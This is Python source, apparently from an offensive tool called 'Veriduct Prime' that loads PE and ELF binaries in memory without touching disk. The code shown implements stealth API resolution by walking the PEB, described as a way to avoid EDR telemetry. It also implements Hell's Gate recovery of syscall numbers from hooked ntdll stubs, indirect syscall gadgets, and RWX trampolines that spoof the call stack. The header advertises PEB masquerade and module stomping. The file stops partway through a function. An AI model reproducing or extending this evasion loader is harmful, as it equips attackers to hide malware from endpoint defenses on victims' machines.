#!/usr/bin/env python3
"""
Veriduct Prime - Production Edition
Advanced file semantic annihilation with enhanced native binary execution support

Supports:
- Python bytecode (.pyc, .py)
- Windows PE executables (.exe, .dll) with TLS, SEH, delay-load imports
- Linux ELF binaries with dynamic linking, GOT/PLT resolution
- Mach-O binaries (future)

Features:
- Semantic Shatter Mapping (SSM)
- XOR Entanglement
- Variable chunking
- Substrate poisoning
- HMAC integrity
- Disguised keymaps
- Fileless execution via MemorySubstrate
- Native binary loading (PE/ELF)
- Identity Cloak (runtime PEB masquerade)

Native Loader Capabilities:
- PE: TLS callbacks, SEH registration, delay-load imports, import resolution, base relocations
- ELF: Section header parsing, dynamic linking, shared library loading, RELA/REL relocations
- Memory management and cleanup

Version: 2.6 (CFG-Safe Gadgets + Module Stomping)
"""

import os
import sys
import json
import hashlib
import argparse
import datetime
import random
import logging
import base64
import hmac
import sqlite3
import marshal
import types
import builtins
import struct
import ctypes
import platform
from typing import List, Tuple, Dict, Optional, Iterator
# --- FIX 3: Platform guard (v2.3) ---
_IS_WINDOWS = platform.system() == "Windows"

if _IS_WINDOWS:
    from ctypes import wintypes
else:
    # Stub: provides wintypes type names so Structure definitions parse on Linux.
    # These classes are never instantiated on non-Windows platforms.
    import types as _types
    wintypes = _types.SimpleNamespace(
        USHORT=ctypes.c_ushort,
        ULONG=ctypes.c_ulong,
        DWORD=ctypes.c_ulong,
        LONG=ctypes.c_long,
        BOOLEAN=ctypes.c_byte,
        BYTE=ctypes.c_byte,
        HANDLE=ctypes.c_void_p,
        LPWSTR=ctypes.c_wchar_p,
        LPVOID=ctypes.c_void_p,
        BOOL=ctypes.c_int,
        WCHAR=ctypes.c_wchar,
    )
    # WINFUNCTYPE doesn't exist on Linux; alias to CFUNCTYPE so that
    # class-level and function-pointer type definitions parse without error.
    # None of these code paths execute on Linux.
    ctypes.WINFUNCTYPE = ctypes.CFUNCTYPE

# ==============================================================================
# Compression Layer
# ==============================================================================

try:
    import zstandard as zstd
    class Compressor:
        @staticmethod
        def compress(data: bytes) -> bytes:
            return zstd.ZstdCompressor().compress(data)
        @staticmethod
        def decompress(data: bytes) -> bytes:
            return zstd.ZstdDecompressor().decompress(data)
except ImportError:
    import zlib
    class Compressor:
        @staticmethod
        def compress(data: bytes) -> bytes:
            return zlib.compress(data)
        @staticmethod
        def decompress(data: bytes) -> bytes:
            return zlib.decompress(data)

# ==============================================================================
# Callback Pinning Registry  (FIX 2, v2.3)
# ==============================================================================
# ctypes callbacks wrapping Python functions MUST be prevented from garbage
# collection for as long as native code may invoke them.  Any callback whose
# address is written into a PE's IAT gets appended here; the list is only
# cleared explicitly during cleanup.
_pinned_callbacks: list = []

# ==============================================================================
# Constants
# ==============================================================================

CHUNK_SIZE = 4096
KEY_FILE = "veriduct_key.zst"
DB_FILE = "veriduct_chunks.db"
DISGUISE_FORMATS = ["csv", "log", "conf"]
DEFAULT_USF_WIPE_SIZE = 256
BATCH_FLUSH_THRESHOLD = 1000
FILE_SALT_SIZE = 16
KEYMAP_FORMAT_VERSION = 7  # Bumped for native binary support
PAGE_NOACCESS = 0x01
PAGE_READONLY = 0x02
PAGE_READWRITE = 0x04
PAGE_EXECUTE = 0x10
PAGE_EXECUTE_READ = 0x20
PAGE_EXECUTE_READWRITE = 0x40

IMAGE_SCN_MEM_EXECUTE = 0x20000000
IMAGE_SCN_MEM_READ = 0x40000000
IMAGE_SCN_MEM_WRITE = 0x80000000

# PEB Structures for CRT initialization
class UNICODE_STRING(ctypes.Structure):
    _fields_ = [
        ("Length", wintypes.USHORT),
        ("MaximumLength", wintypes.USHORT),
        ("Buffer", wintypes.LPWSTR),
    ]

class LIST_ENTRY(ctypes.Structure):
    pass
LIST_ENTRY._fields_ = [
    ("Flink", ctypes.POINTER(LIST_ENTRY)),
    ("Blink", ctypes.POINTER(LIST_ENTRY)),
]

class PEB_LDR_DATA(ctypes.Structure):
    _fields_ = [
        ("Length", wintypes.ULONG),
        ("Initialized", wintypes.BOOLEAN),
        ("SsHandle", wintypes.HANDLE),
        ("InLoadOrderModuleList", LIST_ENTRY),
        ("InMemoryOrderModuleList", LIST_ENTRY),
        ("InInitializationOrderModuleList", LIST_ENTRY),
    ]

class CURDIR(ctypes.Structure):
    _fields_ = [
        ("DosPath", UNICODE_STRING),
        ("Handle", wintypes.HANDLE),
    ]

class RTL_USER_PROCESS_PARAMETERS(ctypes.Structure):
    _fields_ = [
        ("MaximumLength", wintypes.ULONG),
        ("Length", wintypes.ULONG),
        ("Flags", wintypes.ULONG),
        ("DebugFlags", wintypes.ULONG),
        ("ConsoleHandle", wintypes.HANDLE),
        ("ConsoleFlags", wintypes.ULONG),
        ("StandardInput", wintypes.HANDLE),
        ("StandardOutput", wintypes.HANDLE),
        ("StandardError", wintypes.HANDLE),
        ("CurrentDirectory", CURDIR),
        ("DllPath", UNICODE_STRING),
        ("ImagePathName", UNICODE_STRING),
        ("CommandLine", UNICODE_STRING),
    ]

class PEB(ctypes.Structure):
    _fields_ = [
        ("InheritedAddressSpace", wintypes.BOOLEAN),
        ("ReadImageFileExecOptions", wintypes.BOOLEAN),
        ("BeingDebugged", wintypes.BOOLEAN),
        ("BitField", wintypes.BYTE),
        ("Padding0", wintypes.BYTE * 4),
        ("Mutant", wintypes.HANDLE),
        ("ImageBaseAddress", wintypes.LPVOID),
        ("Ldr", ctypes.POINTER(PEB_LDR_DATA)),
        ("ProcessParameters", ctypes.POINTER(RTL_USER_PROCESS_PARAMETERS)),
    ]

class PROCESS_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("Reserved1", wintypes.LPVOID),
        ("PebBaseAddress", ctypes.POINTER(PEB)),
        ("Reserved2", wintypes.LPVOID * 2),
        ("UniqueProcessId", ctypes.POINTER(wintypes.ULONG)),
        ("Reserved3", wintypes.LPVOID),
    ]

class LDR_DATA_TABLE_ENTRY(ctypes.Structure):
    """Loader data table entry for module enumeration."""
    pass

LDR_DATA_TABLE_ENTRY._fields_ = [
    ("InLoadOrderLinks", LIST_ENTRY),
    ("InMemoryOrderLinks", LIST_ENTRY),
    ("InInitializationOrderLinks", LIST_ENTRY),
    ("DllBase", wintypes.LPVOID),
    ("EntryPoint", wintypes.LPVOID),
    ("SizeOfImage", wintypes.ULONG),
    ("FullDllName", UNICODE_STRING),
    ("BaseDllName", UNICODE_STRING),
]


class StealthResolver:
    """
    Resolve Windows API functions without using ctypes.windll (which triggers EDR telemetry).
    Walks PEB -> LDR -> module list, then parses PE export tables manually.
    """
    _instance = None
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance._initialized = False
        return cls._instance
    
    def __init__(self):
        if self._initialized:
            return
        self._initialized = True
        self._module_cache = {}  # name.lower() -> base_address
        self._proc_cache = {}    # (module, func) -> address
        self._peb = None
        self._init_from_peb()
    
    def _init_from_peb(self):
        """Walk PEB to find loaded modules. Stealth-only, no fallbacks."""
        self._fallback_mode = False
        try:
            self._bootstrap_peb()
        except Exception as e:
            logging.error(f"StealthResolver init failed: {e}")
            logging.error("Stealth API resolution not available - this is required for operation")
            raise
    
    def _bootstrap_peb(self):
        """Get PEB address. Try multiple methods for maximum compatibility."""
        import ctypes.wintypes as wt
        
        # Method 1: RtlGetCurrentPeb - simplest, exported by ntdll
        # This is what PythonForWindows uses and is very reliable
        try:
            ntdll = ctypes.windll.ntdll
            ntdll.RtlGetCurrentPeb.restype = ctypes.c_void_p
            peb_addr = ntdll.RtlGetCurrentPeb()
            if peb_addr:
                self._peb = ctypes.cast(peb_addr, ctypes.POINTER(PEB)).contents
                logging.debug(f"StealthResolver: Got PEB via RtlGetCurrentPeb at 0x{peb_addr:X}")
                self._walk_ldr_modules()
                return
        except Exception as e:
            logging.debug(f"RtlGetCurrentPeb failed: {e}")
        
        # Method 2: NtQueryInformationProcess - fallback
        try:
            NtQueryInformationProcess = ctypes.windll.ntdll.NtQueryInformationProcess
            GetCurrentProcess = ctypes.windll.kernel32.GetCurrentProcess
            
            # Set up proper types
            NtQueryInformationProcess.argtypes = [
                ctypes.c_void_p,  # ProcessHandle
                ctypes.c_ulong,   # ProcessInformationClass
                ctypes.c_void_p,  # ProcessInformation
                ctypes.c_ulong,   # ProcessInformationLength
                ctypes.POINTER(wt.ULONG)  # ReturnLength
            ]
            NtQueryInformationProcess.restype = ctypes.c_long
            
            GetCurrentProcess.restype = ctypes.c_void_p
            
            pbi = PROCESS_BASIC_INFORMATION()
            ret_len = wt.ULONG()
            
            handle = GetCurrentProcess()
            status = NtQueryInformationProcess(
                handle, 0, ctypes.byref(pbi),
                ctypes.sizeof(pbi), ctypes.byref(ret_len)
            )
            if status != 0:
                raise RuntimeError(f"NtQueryInformationProcess failed: {status}")
            
            self._peb = pbi.PebBaseAddress.contents
            logging.debug(f"StealthResolver: Got PEB via NtQueryInformationProcess")
            self._walk_ldr_modules()
            return
        except Exception as e:
            logging.debug(f"NtQueryInformationProcess failed: {e}")
        
        raise RuntimeError("All PEB acquisition methods failed")
    
    def _walk_ldr_modules(self):
        """Walk PEB.Ldr.InMemoryOrderModuleList to find all loaded modules."""
        ldr = self._peb.Ldr.contents
        
        # InMemoryOrderModuleList is a circular doubly-linked list
        # The list head is embedded in PEB_LDR_DATA, entries are LDR_DATA_TABLE_ENTRY
        list_head = ctypes.addressof(ldr.InMemoryOrderModuleList)
        current = ldr.InMemoryOrderModuleList.Flink
        
        while ctypes.addressof(current.contents) != list_head:
            # The LIST_ENTRY is at offset 0x10 in LDR_DATA_TABLE_ENTRY (InMemoryOrderLinks)
            # So we subtract 0x10 (on x64, or 0x08 on x86) to get the entry base
            # Actually, for InMemoryOrderLinks which is the second LIST_ENTRY:
            # Offset = sizeof(LIST_ENTRY) = 16 bytes on x64, 8 bytes on x86
            entry_offset = ctypes.sizeof(LIST_ENTRY)
            entry_addr = ctypes.addressof(current.contents) - entry_offset
            
            entry = ctypes.cast(entry_addr, ctypes.POINTER(LDR_DATA_TABLE_ENTRY)).contents
            
            if entry.DllBase and entry.BaseDllName.Buffer:
                try:
                    # Read the DLL name
                    name_len = entry.BaseDllName.Length // 2  # Length is in bytes, we want chars
                    dll_name = ctypes.wstring_at(entry.BaseDllName.Buffer, name_len).lower()
                    base = entry.DllBase
                    
                    if isinstance(base, int):
                        base_int = base
                    else:
                        base_int = ctypes.cast(base, ctypes.c_void_p).value
                    
                    self._module_cache[dll_name] = base_int
                    logging.debug(f"StealthResolver: Found {dll_name} at 0x{base_int:X}")
                except Exception:
                    pass
            
            current = current.contents.Flink
    
    def get_module_base(self, module_name: str) -> int:
        """Get base address of a loaded module via stealth resolution."""
        name_lower = module_name.lower()
        
        if name_lower in self._module_cache:
            return self._module_cache[name_lower]
        
        # Try without extension
        if not name_lower.endswith('.dll'):
            if name_lower + '.dll' in self._module_cache:
                return self._module_cache[name_lower + '.dll']
        
        return 0
    
    def get_proc_address(self, module_name: str, proc_name: str) -> int:
        """
        Get function address by parsing module's export table.
        Equivalent to GetProcAddress but without API calls - pure stealth.
        """
        cache_key = (module_name.lower(), proc_name if isinstance(proc_name, str) else proc_name.decode('ascii'))
        if cache_key in self._proc_cache:
            return self._proc_cache[cache_key]
        
        base = self.get_module_base(module_name)
        if not base:
            logging.warning(f"StealthResolver: Module {module_name} not found in PEB")
            return 0
        
        addr = self._parse_exports(base, proc_name)
        if addr:
            self._proc_cache[cache_key] = addr
        return addr
    
    def _parse_exports(self, base: int, proc_name: str) -> int:
        """Parse PE export table to find function address."""
        try:
            # Read DOS header
            dos_magic = ctypes.string_at(base, 2)
            if dos_magic != b'MZ':
                return 0
            
            # Get PE header offset
            pe_offset = struct.unpack('<I', ctypes.string_at(base + 0x3C, 4))[0]
            pe_sig = ctypes.string_at(base + pe_offset, 4)
            if pe_sig != b'PE\x00\x00':
                return 0
            
            # Check if PE32 or PE32+
            magic = struct.unpack('<H', ctypes.string_at(base + pe_offset + 24, 2))[0]
            is_64 = (magic == 0x20b)
            
            # Export directory RVA is at different offsets for PE32 vs PE32+
            if is_64:
                export_rva = struct.unpack('<I', ctypes.string_at(base + pe_offset + 24 + 112, 4))[0]
                export_size = struct.unpack('<I', ctypes.string_at(base + pe_offset + 24 + 116, 4))[0]
            else:
                export_rva = struct.unpack('<I', ctypes.string_at(base + pe_offset + 24 + 96, 4))[0]
                export_size = struct.unpack('<I', ctypes.string_at(base + pe_offset + 24 + 100, 4))[0]
            
            if export_rva == 0:
                return 0
            
            export_dir = base + export_rva
            
            # Parse IMAGE_EXPORT_DIRECTORY
            num_functions = struct.unpack('<I', ctypes.string_at(export_dir + 20, 4))[0]
            num_names = struct.unpack('<I', ctypes.string_at(export_dir + 24, 4))[0]
            addr_table_rva = struct.unpack('<I', ctypes.string_at(export_dir + 28, 4))[0]
            name_table_rva = struct.unpack('<I', ctypes.string_at(export_dir + 32, 4))[0]
            ordinal_table_rva = struct.unpack('<I', ctypes.string_at(export_dir + 36, 4))[0]
            
            # Search by name
            if isinstance(proc_name, str):
                proc_name_bytes = proc_name.encode('ascii')
            else:
                proc_name_bytes = proc_name
            
            for i in range(num_names):
                name_rva = struct.unpack('<I', ctypes.string_at(base + name_table_rva + i * 4, 4))[0]
                name = ctypes.string_at(base + name_rva)
                
                if name == proc_name_bytes:
                    # Found it - get ordinal, then address
                    ordinal = struct.unpack('<H', ctypes.string_at(base + ordinal_table_rva + i * 2, 2))[0]
                    func_rva = struct.unpack('<I', ctypes.string_at(base + addr_table_rva + ordinal * 4, 4))[0]
                    
                    # Check for forwarder (RVA points within export section)
                    if export_rva <= func_rva < export_rva + export_size:
                        # Forwarder: RVA points to an ASCII string like
                        # "ntdll.RtlExitUserThread" or "api-ms-win-...func"
                        # Resolve by parsing the string and recursing. (FIX 9, v2.5)
                        try:
                            fwd_str = ctypes.string_at(base + func_rva).decode('ascii')
                            dot = fwd_str.index('.')
                            fwd_module = fwd_str[:dot]
                            fwd_func = fwd_str[dot + 1:]
                            # Normalise module name (add .dll if missing)
                            if not fwd_module.lower().endswith('.dll'):
                                fwd_module += '.dll'
                            logging.debug(f"StealthResolver: {proc_name} -> {fwd_module}!{fwd_func}")
                            # Check for ordinal forward (e.g. "#123")
                            if fwd_func.startswith('#'):
                                # Ordinal forwarder — not common, skip for safety
                                logging.debug(f"StealthResolver: Ordinal forwarder, skipping")
                                return 0
                            return self.get_proc_address(fwd_module, fwd_func)
                        except Exception as e:
                            logging.debug(f"StealthResolver: Forwarder resolution failed: {e}")
                            return 0
                    
                    return base + func_rva
            
            return 0
            
        except Exception as e:
            logging.debug(f"StealthResolver: Failed to parse exports: {e}")
            return 0
    
    def load_library(self, dll_name: str) -> int:
        """
        Load a DLL. For DLLs not already loaded, we unfortunately need LoadLibraryA.
        But we call it through our resolved address, not ctypes.windll.
        """
        # Check if already loaded
        base = self.get_module_base(dll_name)
        if base:
            return base
        
        # Need to actually load it - get LoadLibraryA address
        load_lib_addr = self.get_proc_address("kernel32.dll", "LoadLibraryA")
        if not load_lib_addr:
            return 0
        
        # Call LoadLibraryA through the resolved address using WINFUNCTYPE
        LoadLibraryA = ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.c_char_p)(load_lib_addr)
        
        if isinstance(dll_name, str):
            dll_name = dll_name.encode('ascii')
        
        handle = LoadLibraryA(dll_name)
        if handle:
            handle_int = handle if isinstance(handle, int) else ctypes.cast(handle, ctypes.c_void_p).value
            # Cache it
            name_str = dll_name.decode('ascii') if isinstance(dll_name, bytes) else dll_name
            self._module_cache[name_str.lower()] = handle_int
            return handle_int
        return 0


# Global resolver instance - initialized lazily on first use
_stealth_resolver = None

def get_stealth_resolver() -> StealthResolver:
    """Get or create the global StealthResolver instance."""
    global _stealth_resolver
    if _stealth_resolver is None:
        _stealth_resolver = StealthResolver()
    return _stealth_resolver

# ==============================================================================
# Indirect Syscall Engine + Call Stack Spoofing
# ==============================================================================
#
# SyscallEngine: Extracts SSNs from ntdll stubs, locates syscall;ret gadgets
# in ntdll's .text section, and builds two-stage trampolines that:
#   1. Execute syscall from within ntdll's address space (indirect syscall)
#   2. Spoof the RBP frame chain to show kernel32 -> ntdll ancestry
#
# Hell's Gate: If a stub is hooked (first bytes overwritten), infers the SSN
# from clean neighboring stubs (SSNs are sequential by address in ntdll).
#
# Trampoline (x64):
#   Stage 1: save rbp/r12 -> spoof rbp -> [rsp]=stage2 -> mov r10,rcx;
#            mov eax,SSN -> jmp ntdll_gadget
#   Stage 2: restore rbp -> push r12 (real return) -> restore r12 -> ret
#   Data:    saved_rbp | saved_r12 | fake_frame_0 | fake_frame_1
#
# NOT thread-safe per-function (fixed data area for register saves).
# ==============================================================================

class SyscallEngine:
    _instance = None

    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance._initialized = False
        return cls._instance

    def __init__(self):
        if self._initialized:
            return
        self._initialized = True
        self._ssn_cache = {}
        self._gadget_addr = 0
        self._func_gadgets = {}   # FIX 11: per-function syscall gadget addresses
        self._trampolines = {}
        self._trampoline_allocs = []
        self._spoof_targets = {}
        self._VirtualAlloc = None
        self._VirtualFree = None
        self._available = False
        try:
            self._init_engine()
            self._available = True
        except Exception as e:
            logging.warning(f"SyscallEngine: Init failed ({e}) - falling back to standard calls")

    @property
    def available(self):
        return self._available

    def _init_engine(self):
        resolver = get_stealth_resolver()
        ntdll_base = resolver.get_module_base("ntdll.dll")
        if not ntdll_base:
            raise RuntimeError("ntdll.dll not found in PEB")

        va_addr = resolver.get_proc_address("kernel32.dll", "VirtualAlloc")
        vf_addr = resolver.get_proc_address("kernel32.dll", "VirtualFree")
        if not va_addr:
            raise RuntimeError("Cannot resolve VirtualAlloc for trampoline allocation")
        self._VirtualAlloc = ctypes.WINFUNCTYPE(
            ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t,
            ctypes.c_ulong, ctypes.c_ulong
        )(va_addr)
        if vf_addr:
            self._VirtualFree = ctypes.WINFUNCTYPE(
                ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong
            )(vf_addr)

        self._gadget_addr = self._find_syscall_ret_gadget(ntdll_base)
        if not self._gadget_addr:
            raise RuntimeError("No clean syscall;ret gadget in ntdll")
        self._extract_ssns(ntdll_base, resolver)
        if not self._ssn_cache:
            raise RuntimeError("Failed to extract any SSNs")
        self._find_spoof_targets(resolver)

        logging.info(
            f"SyscallEngine: Ready — {len(self._ssn_cache)} SSNs, "
            f"gadget @ 0x{self._gadget_addr:X}, "
            f"spoof targets: {len(self._spoof_targets)}"
        )

    # --- Gadget Scanner ---

    def _find_syscall_ret_gadget(self, ntdll_base: int) -> int:
        pe_offset = struct.unpack('<I', ctypes.string_at(ntdll_base + 0x3C, 4))[0]
        num_sections = struct.unpack('<H', ctypes.string_at(ntdll_base + pe_offset + 6, 2))[0]
        opt_size = struct.unpack('<H', ctypes.string_at(ntdll_base + pe_offset + 20, 2))[0]
        section_hdr = ntdll_base + pe_offset + 24 + opt_size

        text_rva = text_vsize = 0
        for i in range(num_sections):
            off = section_hdr + i * 40
            name = ctypes.string_at(off, 8).rstrip(b'\x00')
            if name == b'.text':
                text_vsize = struct.unpack('<I', ctypes.string_at(off + 8, 4))[0]
                text_rva = struct.unpack('<I', ctypes.string_at(off + 12, 4))[0]
                break
        if not text_rva or not text_vsize:
            return 0

        scan_start = ntdll_base + text_rva
        scan_end = scan_start + text_vsize - 2
        CHUNK = 8192
        current = scan_start
        while current < scan_end:
            chunk_len = min(CHUNK, scan_end - current + 3)
            try:
                chunk = ctypes.string_at(current, chunk_len)
            except OSError:
                current += CHUNK - 2
                continue
            for j in range(len(chunk) - 2):
                if chunk[j] == 0x0F and chunk[j + 1] == 0x05 and chunk[j + 2] == 0xC3:
                    gadget = current + j
                    logging.info(f"SyscallEngine: syscall;ret gadget @ 0x{gadget:X}")
                    return gadget
            current += CHUNK - 2
        return 0

    # --- SSN Extraction + Hell's Gate Recovery ---

    _TARGET_FUNCTIONS = [
        "NtAllocateVirtualMemory", "NtProtectVirtualMemory",
        "NtFreeVirtualMemory", "NtCreateThreadEx",
        "NtWaitForSingleObject", "NtQueryInformationProcess",
        "NtClose", "NtWriteVirtualMemory", "NtReadVirtualMemory",
    ]
    _NEIGHBOR_FUNCTIONS = _TARGET_FUNCTIONS + [
        "NtOpenProcess", "NtCreateFile", "NtOpenFile",
        "NtQuerySystemInformation", "NtCreateSection",
        "NtMapViewOfSection", "NtUnmapViewOfSection",
        "NtSetInformationThread", "NtQueryVirtualMemory",
        "NtResumeThread", "NtSuspendThread",
        "NtGetContextThread", "NtSetContextThread", "NtDelayExecution",
    ]

    def _extract_ssns(self, ntdll_base, resolver):
        for func_name in self._TARGET_FUNCTIONS:
            addr = resolver.get_proc_address("ntdll.dll", func_name)
            if not addr:
                continue
            ssn = self._read_ssn_from_stub(addr)
            if ssn is None:
                logging.debug(f"SyscallEngine: {func_name} appears hooked, trying Hell's Gate")
                ssn = self._hells_gate_recover(ntdll_base, resolver, func_name, addr)
            if ssn is not None:
                self._ssn_cache[func_name] = ssn
                # FIX 11: Record per-function syscall gadget for CFG safety.
                # If the stub is clean, its own syscall instruction at +8 is the
                # safest gadget (within the function's own code range → CFG-valid).
                # If hooked, _hells_gate_recover stores the clean neighbor's gadget.
                if func_name not in self._func_gadgets:
                    gadget = self._find_stub_syscall(addr)
                    if gadget:
                        self._func_gadgets[func_name] = gadget
                logging.debug(f"SyscallEngine: {func_name} SSN = 0x{ssn:04X}"
                              f" gadget @ 0x{self._func_gadgets.get(func_name, 0):X}")
            else:
                logging.warning(f"SyscallEngine: No SSN for {func_name}")

    def _find_stub_syscall(self, func_addr: int) -> int:
        """Find the syscall;ret gadget within an ntdll stub (FIX 11).

        Scans the first 32 bytes of the stub for the 0F 05 C3 (syscall; ret)
        pattern.  Different Windows builds place syscall at different offsets:

          Standard (≤1809):     offset +8   (4C8BD1 B8xxxx0000 0F05 C3)
          Instrumented (1903+): offset +18  (4C8BD1 B8xxxx0000 F60425...01 7503 0F05 C3)

        Returns the address of the syscall instruction, or 0 if not found.
        """
        try:
            stub_bytes = ctypes.string_at(func_addr, 32)
            for i in range(len(stub_bytes) - 2):
                if stub_bytes[i] == 0x0F and stub_bytes[i+1] == 0x05 and stub_bytes[i+2] == 0xC3:
                    return func_addr + i
        except OSError:
            pass
        return 0

    def _read_ssn_from_stub(self, func_addr):
        try:
            stub = ctypes.string_at(func_addr, 8)
        except OSError:
            return None
        if stub[0:3] == b'\x4C\x8B\xD1' and stub[3] == 0xB8:
            return struct.unpack('<I', stub[4:8])[0]
        return None

    def _hells_gate_recover(self, ntdll_base, resolver, target_name, target_addr):
        nt_funcs = []
        for name in self._NEIGHBOR_FUNCTIONS:
            addr = resolver.get_proc_address("ntdll.dll", name)
            if addr:
                nt_funcs.append((name, addr))
        if not nt_funcs:
            return None
        nt_funcs.sort(key=lambda x: x[1])
        target_idx = next((i for i, (n, _) in enumerate(nt_funcs) if n == target_name), None)
        if target_idx is None:
            return None

        for distance in range(1, min(8, len(nt_funcs))):
            idx_below = target_idx - distance
            if idx_below >= 0:
                ssn = self._read_ssn_from_stub(nt_funcs[idx_below][1])
                if ssn is not None:
                    recovered = ssn + distance
                    # FIX 11: Borrow the clean neighbor's syscall gadget
                    neighbor_gadget = self._find_stub_syscall(nt_funcs[idx_below][1])
                    if neighbor_gadget:
                        self._func_gadgets[target_name] = neighbor_gadget
                    logging.info(
                        f"SyscallEngine: Hell's Gate recovered {target_name} "
                        f"SSN=0x{recovered:04X} from {nt_funcs[idx_below][0]}"
                    )
                    return recovered
            idx_above = target_idx + distance
            if idx_above < len(nt_funcs):
                ssn = self._read_ssn_from_stub(nt_funcs[idx_above][1])
                if ssn is not None:
                    recovered = ssn - distance
                    if recovered >= 0:
                        # FIX 11: Borrow the clean neighbor's syscall gadget
                        neighbor_gadget = self._find_stub_syscall(nt_funcs[idx_above][1])
                        if neighbor_gadget:
                            self._func_gadgets[target_name] = neighbor_gadget
                        logging.info(
                            f"SyscallEngine: Hell's Gate recovered {target_name} "
                            f"SSN=0x{recovered:04X} from {nt_funcs[idx_above][0]}"
                        )
                        return recovered
        return None

    # --- Spoof Targets (legitimate return addrs for fake RBP chain) ---

    def _find_spoof_targets(self, resolver):
        k32 = resolver.get_proc_address("kernel32.dll", "BaseThreadInitThunk")
        if k32:
            self._spoof_targets['kernel32_ret'] = k32 + 0x14
        else:
            fb = resolver.get_proc_address("kernel32.dll", "WaitForSingleObjectEx")
            if fb:
                self._spoof_targets['kernel32_ret'] = fb + 0x10

        ntdll = resolver.get_proc_address("ntdll.dll", "RtlUserThreadStart")
        if ntdll:
            self._spoof_targets['ntdll_ret'] = ntdll + 0x21
        else:
            fb = resolver.get_proc_address("ntdll.dll", "LdrInitializeThunk")
            if fb:
                self._spoof_targets['ntdll_ret'] = fb + 0x10

    # --- Two-Stage Trampoline Builder ---

    def _build_trampoline(self, func_name):
        ssn = self._ssn_cache.get(func_name)
        if ssn is None:
            return 0
        # FIX 11: Prefer per-function gadget (within the function's own stub
        # → CFG-valid).  Fall back to global gadget if no per-function available.
        gadget_addr = self._func_gadgets.get(func_name, self._gadget_addr)
        k32_ret = self._spoof_targets.get('kernel32_ret', 0)
        ntdll_ret = self._spoof_targets.get('ntdll_ret', 0)

        # Stage 1: 78 bytes — save state, spoof rbp, indirect syscall
        s1 = bytearray()
        s1 += b'\x48\xB8' + b'\x00' * 8       # mov rax, <saved_rbp>
        s1 += b'\x48\x89\x28'                  # mov [rax], rbp
        s1 += b'\x48\xB8' + b'\x00' * 8       # mov rax, <saved_r12>
        s1 += b'\x4C\x89\x20'                  # mov [rax], r12
        s1 += b'\x4C\x8B\x24\x24'              # mov r12, [rsp]
        s1 += b'\x48\xB8' + b'\x00' * 8       # mov rax, <fake_frame_0>
        s1 += b'\x48\x89\xC5'                  # mov rbp, rax
        s1 += b'\x48\xB8' + b'\x00' * 8       # mov rax, <stage2>
        s1 += b'\x48\x89\x04\x24'              # mov [rsp], rax
        s1 += b'\x4C\x8B\xD1'                  # mov r10, rcx
        s1 += b'\x49\xBB' + b'\x00' * 8       # mov r11, <gadget>
        s1 += b'\xB8' + struct.pack('<I', ssn) # mov eax, SSN
        s1 += b'\x41\xFF\xE3'                  # jmp r11

        # Stage 2: 29 bytes — restore state, return (FIX 8, v2.5)
        # CRITICAL: Must NOT clobber rax — it holds the NTSTATUS return value
        # from the syscall.  Original code used rax as scratch for data area
        # loads, destroying the return value.  Use r11 instead (caller-saved,
        # not part of the return value ABI).
        s2 = bytearray()
        s2 += b'\x49\xBB' + b'\x00' * 8       # mov r11, <saved_rbp>
        s2 += b'\x49\x8B\x2B'                  # mov rbp, [r11]
        s2 += b'\x41\x54'                       # push r12
        s2 += b'\x49\xBB' + b'\x00' * 8       # mov r11, <saved_r12>
        s2 += b'\x4D\x8B\x23'                  # mov r12, [r11]
        s2 += b'\xC3'                           # ret

        s1_sz, s2_sz = len(s1), len(s2)

        # Data: saved_rbp(8) + saved_r12(8) + frame0(16) + frame1(16) = 48
        data = bytearray(16)  # saved_rbp + saved_r12
        data += b'\x00' * 8 + struct.pack('<Q', k32_ret)       # frame0
        data += struct.pack('<Q', 0) + struct.pack('<Q', ntdll_ret)  # frame1
        total = s1_sz + s2_sz + len(data)

        mem = self._VirtualAlloc(None, total, 0x3000, PAGE_EXECUTE_READWRITE)
        if not mem:
            return 0
        base = mem if isinstance(mem, int) else ctypes.cast(mem, ctypes.c_void_p).value
        self._trampoline_allocs.append(base)

        s2_va = base + s1_sz
        d_va = base + s1_sz + s2_sz
        rbp_va, r12_va = d_va, d_va + 8
        f0_va, f1_va = d_va + 16, d_va + 32

        struct.pack_into('<Q', data, 16, f1_va)         # frame0.next -> frame1

        struct.pack_into('<Q', s1, 0x02, rbp_va)        # saved_rbp addr
        struct.pack_into('<Q', s1, 0x0F, r12_va)        # saved_r12 addr
        struct.pack_into('<Q', s1, 0x20, f0_va)         # fake_frame_0 addr
        struct.pack_into('<Q', s1, 0x2D, s2_va)         # stage2 addr
        struct.pack_into('<Q', s1, 0x3E, gadget_addr)   # ntdll gadget addr

        struct.pack_into('<Q', s2, 0x02, rbp_va)        # saved_rbp addr
        struct.pack_into('<Q', s2, 0x11, r12_va)        # saved_r12 addr

        ctypes.memmove(base, bytes(s1) + bytes(s2) + bytes(data), total)

        # NOTE (FIX 7, v2.4): DO NOT downgrade to PAGE_EXECUTE_READ.
        # The trampoline's data area (saved_rbp, saved_r12, fake RBP frames)
        # lives at offset s1_sz+s2_sz within the same page as the code.
        # Stage 1 writes to saved_rbp/saved_r12 at runtime via:
        #   mov rax, <saved_rbp_addr>; mov [rax], rbp
        # Marking the page RX causes an immediate access violation on the
        # first syscall.  Code + data share a single page (~155 bytes total),
        # so page-granularity protection can't split them.  RWX is required.

        logging.debug(f"SyscallEngine: {func_name} SSN=0x{ssn:04X} trampoline @ 0x{base:X}")
        return base

    # --- Callable Factory ---

    def get_syscall_func(self, func_name, restype, *argtypes):
        if func_name not in self._trampolines:
            addr = self._build_trampoline(func_name)
            if not addr:
                return None
            self._trampolines[func_name] = addr
        return ctypes.WINFUNCTYPE(restype, *argtypes)(self._trampolines[func_name])

    # --- High-Level Wrappers ---

    def nt_alloc(self, address, size, alloc_type, protect):
        fn = self.get_syscall_func(
            "NtAllocateVirtualMemory", ctypes.c_long,
            ctypes.c_void_p, ctypes.POINTER(ctypes.c_void_p), ctypes.c_void_p,
            ctypes.POINTER(ctypes.c_size_t), ctypes.c_ulong, ctypes.c_ulong,
        )
        if not fn:
            return 0
        ba = ctypes.c_void_p(address)
        rs = ctypes.c_size_t(size)
